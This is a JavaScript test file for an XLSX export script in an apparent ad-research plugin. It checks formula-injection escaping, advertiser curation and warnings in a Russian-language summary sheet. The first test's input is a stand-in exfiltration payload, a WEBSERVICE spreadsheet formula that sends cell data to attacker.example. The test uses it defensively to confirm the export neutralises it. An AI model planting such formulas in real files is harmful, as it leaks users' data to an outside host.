import assert from 'node:assert/strict';
import { test } from 'node:test';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { toCsv } from '../plugins/meta-ads-niche-report/skills/meta-ads-niche-report/scripts/collector.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SCRIPT = path.join(__dirname, '..', 'plugins', 'meta-ads-niche-report', 'skills', 'meta-ads-niche-report', 'scripts', 'export_xlsx.py');
const py = (args, opts = {}) => spawnSync('python', args, { encoding: 'utf8', env: { ...process.env, PYTHONIOENCODING: 'utf-8' }, ...opts });
const hasOpenpyxl = py(['-c', 'import openpyxl']).status === 0;

test('xlsx export never turns ad text into a formula', { skip: !hasOpenpyxl && 'openpyxl not installed' }, () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'xlsx-'));
  const evil = '=WEBSERVICE("https://attacker.example/?d="&A1)';
  const base = { page_id: '1', fmt: 'image', variants: 3, cta: 'Learn more', link: 'https://salon-x.example/', platforms: 'facebook', kws: ['q'], title: '', start: 1500000000 };
  const rows = ['1', '2', '3'].map((id, i) => ({ ...base, id, page: i < 2 ? 'Salon X' : evil, body: evil }));
  writeFileSync(path.join(dir, 'ads.csv'), toCsv(rows));
  const res = py([SCRIPT, dir]);
  assert.equal(res.status, 0, res.stderr);
  const check = py(['-c', `
import sys
from openpyxl import load_workbook
wb = load_workbook(sys.argv[1])
bad, formulas = [], 0
for ws in wb:
    for row in ws.iter_rows():
        for c in row:
            if c.data_type == 'f':
                formulas += 1
                if 'WEBSERVICE' in str(c.value): bad.append(ws.title + '!' + c.coordinate)
print(len(bad), formulas)
`, path.join(dir, 'report.xlsx')]);
  const [bad, formulas] = check.stdout.trim().split(' ').map(Number);
  assert.equal(bad, 0, 'attacker text became a formula');
  assert.ok(formulas > 0, 'the summary formulas must still be there');
});

test('xlsx export applies curation.json: only kept advertisers, a type column and a queries sheet', { skip: !hasOpenpyxl && 'openpyxl not installed' }, () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'xlsx-cur-'));
  const base = { page_id: '1', fmt: 'image', variants: 1, cta: 'Learn more', link: 'https://x.example/', platforms: 'facebook', title: 't', body: 'b', start: 1_700_000_000 };
  const rows = [
    { ...base, id: '1', page: 'Brewery A', kws: ['q1'] }, { ...base, id: '2', page: 'Bath House', kws: ['q1', 'q2'] }, { ...base, id: '3', page: 'Shop B', kws: ['q2'] }
  ];
  writeFileSync(path.join(dir, 'ads.csv'), toCsv(rows));
  writeFileSync(path.join(dir, 'run.json'), JSON.stringify({ date: new Date(1_700_000_000_000).toISOString(), queries: ['q1', 'q2', 'q3'], rate_limited_queries: ['q2'] }));
  writeFileSync(path.join(dir, 'curation.json'), JSON.stringify({ include: { 'Brewery A': 'Производитель', 'Shop B': 'Магазин' } }));
  const res = py([SCRIPT, dir]);
  assert.equal(res.status, 0, res.stderr);
  const check = py(['-c', `
import sys, json
from openpyxl import load_workbook
wb = load_workbook(sys.argv[1])
ads = [r[2] for r in wb['Объявления'].iter_rows(min_row=2, values_only=True)]
adv = {r[0]: r[-1] for r in wb['Рекламодатели'].iter_rows(min_row=2, values_only=True)}
q = [list(r) for r in wb['Запросы'].iter_rows(min_row=2, max_row=4, values_only=True)]
print(json.dumps({'ads': sorted(ads), 'adv': adv, 'q': q}, ensure_ascii=False))
`, path.join(dir, 'report.xlsx')]);
  const out = JSON.parse(check.stdout);
  assert.deepEqual(out.ads, ['Brewery A', 'Shop B']);
  assert.deepEqual(out.adv, { 'Brewery A': 'Производитель', 'Shop B': 'Магазин' });
  assert.deepEqual(out.q.map(r => r[0]), ['q1', 'q2', 'q3']);
  assert.deepEqual(out.q[1].slice(1), [2, 2, 1, 'да']); // q2: 2 ads, 2 advertisers, 1 competitor (Bath House dropped), rate-limited
  assert.equal(out.q[2][3], 0); // q3 found nothing
});

test('xlsx summary lists the report warnings (season, policy, small sample)', { skip: !hasOpenpyxl && 'openpyxl not installed' }, () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'xlsx-warn-'));
  const base = { page_id: '1', fmt: 'image', variants: 1, cta: 'Learn more', link: 'https://x.example/', platforms: 'facebook', title: 't', body: 'b', start: 1_790_000_000, kws: ['q1'] };
  writeFileSync(path.join(dir, 'ads.csv'), toCsv([{ ...base, id: '1', page: 'Brewery A' }]));
  writeFileSync(path.join(dir, 'run.json'), JSON.stringify({ date: '2026-10-02T12:00:00Z', preset: 'craft-beer-ua', queries: ['q1'] }));
  const res = py([SCRIPT, dir]);
  assert.equal(res.status, 0, res.stderr);
  const check = py(['-c', `
import sys, json
from openpyxl import load_workbook
ws = load_workbook(sys.argv[1])['Сводка']
print(json.dumps([c.value for c in ws['A'] if c.value and (str(c.value).startswith('•') or c.value == 'Предупреждения')], ensure_ascii=False))
`, path.join(dir, 'report.xlsx')]);
  const lines = JSON.parse(check.stdout);
  assert.equal(lines[0], 'Предупреждения');
  assert.ok(lines.some(l => /Октоберфест/.test(l)), 'season');
  assert.ok(lines.some(l => /Алкоголь/.test(l)), 'policy');
  assert.ok(lines.some(l => /только 1 рекламодателей/.test(l)), 'small sample');
});
